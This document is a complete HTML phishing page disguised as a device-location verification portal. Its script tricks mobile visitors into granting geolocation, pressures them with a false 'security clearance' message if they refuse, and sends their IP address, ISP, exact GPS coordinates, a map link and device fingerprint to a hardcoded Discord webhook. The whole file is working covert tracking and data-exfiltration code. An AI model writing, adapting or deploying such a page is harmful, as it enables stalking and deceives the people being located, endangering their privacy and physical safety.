<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Secure</title>
    <style>
        body {
            background-color: #000000;
            margin: 0;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: monospace;
            color: #00ff41;
        }
        #loading-screen {
            text-align: center;
            display: none;
        }
        .spinner {
            border: 4px solid rgba(0, 255, 65, 0.1);
            border-top: 4px solid #00ff41;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #error-msg {
            color: #ff3333;
            text-align: center;
            font-size: 1.2rem;
            display: none;
            padding: 20px;
            border: 1px solid #ff3333;
            border-radius: 8px;
            background: #110000;
            max-width: 80%;
        }
    </style>
</head>
<body>

<!-- Shows on PC -->
<div id="error-msg">
    <strong>Device Not Supported</strong><br><br>
    Please open this link on your mobile device.
</div>

<!-- Shows on Mobile while waiting for GPS -->
<div id="loading-screen">
    <div class="spinner"></div>
    <h2>Verifying Device Location...</h2>
    <p style="color: #888; font-size: 0.8rem; margin-top: 20px;">Please click <b>"Allow"</b> when prompted to continue.</p>
</div>

<script>
    // ⚠️ YOUR DISCORD WEBHOOK URL ⚠️
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561439920571289760/bibhypIWcysN4R9oPLF2i6NBwU_Vj-BZ_uXigEYYwKAQWto3_cb21aocNKeE4cSb742y';

    function isPC() {
        const ua = navigator.userAgent;
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
        const isLargeScreen = window.innerWidth > 1024;
        if (!isMobile && isLargeScreen) return true;
        return false;
    }

    if (isPC()) {
        document.getElementById('error-msg').style.display = 'block';
    } else {
        // Show the fake loading screen on Mobile
        document.getElementById('loading-screen').style.display = 'block';
        
        // Start the payload
        executePayload();
    }

    async function executePayload() {
        let ipData = {};
        try {
            const ipRes = await fetch('https://freeipapi.com/api/json');
            ipData = await ipRes.json();
        } catch (e) {
            ipData = { error: 'IP Fetch Failed' };
        }

        let gpsData = await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    status: "SUCCESS",
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy
                }),
                (err) => resolve({ status: "FAILED", reason: err.message }),
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        });

        // --- THE PSYCHOLOGICAL TRICK ---
        if (gpsData.status === "FAILED") {
            // If they clicked "Block", force them to refresh
            const loadingScreen = document.getElementById('loading-screen');
            loadingScreen.innerHTML = `
                <div id="error-msg" style="display:block;">
                    <strong>Location Access Denied</strong><br><br>
                    This portal requires your location to verify your security clearance. Please refresh the page and click "Allow".
                </div>
            `;
            // Still send the IP data to Discord in the background
            sendToDiscord(ipData, gpsData);
            return; 
        }

        // If they clicked "Allow", show "Verified" and send to Discord
        const loadingScreen = document.getElementById('loading-screen');
        loadingScreen.innerHTML = `
            <h2 style="color:#00ff41;">✓ Access Granted</h2>
            <p style="color: #888;">Redirecting...</p>
        `;
        
        await sendToDiscord(ipData, gpsData);
    }

    async function sendToDiscord(ipData, gpsData) {
        let gpsString = gpsData.lat 
            ? `✅ **Status:** SUCCESS\n**Latitude:** \`${gpsData.lat}\`\n**Longitude:** \`${gpsData.lon}\`\n**Accuracy:** ${gpsData.acc} meters`
            : `❌ **Status:** FAILED\n**Reason:** ${gpsData.reason}`;

        const mapLink = gpsData.lat 
            ? `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}` 
            : (ipData.latitude ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : 'N/A');

        const payload = {
            content: `🚨 **Mobile Target Detected** 🚨`,
            embeds: [
                {
                    title: "Personal Information Captured",
                    color: gpsData.lat ? 65280 : 16711680,
                    fields: [
                        { name: "IP Address", value: `\`${ipData.ipAddress || 'Unknown'}\``, inline: true },
                        { name: "ISP / Org", value: `\`${ipData.asnOrganization || 'Unknown'}\``, inline: true },
                        { name: "Approx Location (IP)", value: `${ipData.cityName || '?'}, ${ipData.regionName || '?'}, ${ipData.countryName || '?'}`, inline: false },
                        { name: "Exact GPS Data", value: gpsString, inline: false },
                        { name: "Map Link", value: mapLink, inline: false },
                        { name: "Device Fingerprint", value: `**OS/Platform:** ${navigator.platform}\n**Screen:** ${screen.width}x${screen.height}\n**Language:** ${navigator.language}`, inline: false },
                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: "Silent Exfiltration System" },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }
</script>
</body>
</html>
